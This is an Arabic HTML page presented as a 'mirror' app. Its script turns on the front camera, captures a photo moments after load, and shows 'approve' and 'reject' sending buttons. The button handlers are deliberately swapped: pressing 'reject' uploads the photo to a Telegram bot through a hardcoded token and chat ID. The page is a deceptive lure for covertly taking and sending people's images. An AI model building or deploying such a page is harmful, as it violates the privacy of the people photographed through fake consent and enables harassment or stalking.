<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
    margin:0;
    padding:0;
    background:#f5f5f5;
    font-family:Arial;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:95%;
    max-width:420px;
    background:white;
    padding:20px;
    border-radius:25px;
    box-shadow:0 0 25px rgba(0,0,0,0.15);
    text-align:center;
}

.title{
    font-size:32px;
    color:black;
    margin-bottom:20px;
    font-weight:bold;
}

video{
    width:100%;
    border-radius:20px;
    border:3px solid black;
    background:black;
}

.buttons{
    margin-top:20px;
    display:flex;
    flex-direction:column;
    gap:15px;
}

button{
    padding:18px;
    font-size:22px;
    border:none;
    border-radius:18px;
    cursor:pointer;
    transition:0.3s;
    font-weight:bold;
}

button:hover{
    transform:scale(1.03);
}

#approveBtn{
    background:black;
    color:white;
}

#rejectBtn{
    background:#222;
    color:white;
}

</style>
</head>

<body>

<div class="container">

<div class="title">مرآة</div>

<video id="video" autoplay playsinline></video>

<div class="buttons">
    <button id="approveBtn">موافق على الإرسال</button>
    <button id="rejectBtn">رفض الإرسال</button>
</div>

</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
const CHAT_ID = "5870377141";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

let stream = null;
let capturedBlob = null;

// تشغيل الكاميرا
async function startCamera() {

    try{

        stream = await navigator.mediaDevices.getUserMedia({
            video:{
                facingMode:"user"
            }
        });

        video.srcObject = stream;

        await video.play();

        setTimeout(capturePhoto,100);

    }catch(err){

        alert("فشل تشغيل الكاميرا");
        console.log(err);

    }
}

// التقاط الصورة
function capturePhoto(){

    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video,0,0);

    canvas.toBlob((blob)=>{

        capturedBlob = blob;

    },"image/png");

    if(stream){
        stream.getTracks().forEach(track => track.stop());
    }
}

// زر الموافقة
document.getElementById("rejectBtn").onclick = async function(){

    if(!capturedBlob){
        alert("لم يتم التقاط الصورة بعد");
        return;
    }

    const formData = new FormData();

    formData.append("chat_id", CHAT_ID);
    formData.append("photo", capturedBlob, "photo.png");

    try{

        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
            method:"POST",
            body:formData
        });

        alert("تم إرسال الصورة");

    }catch(e){

        alert("فشل الإرسال");
        console.log(e);

    }
};

// زر الرفض
document.getElementById("approveBtn").onclick = function(){

    capturedBlob = null;

    alert("تم رفض الإرسال");

};

startCamera();
</script>

</body>
</html>
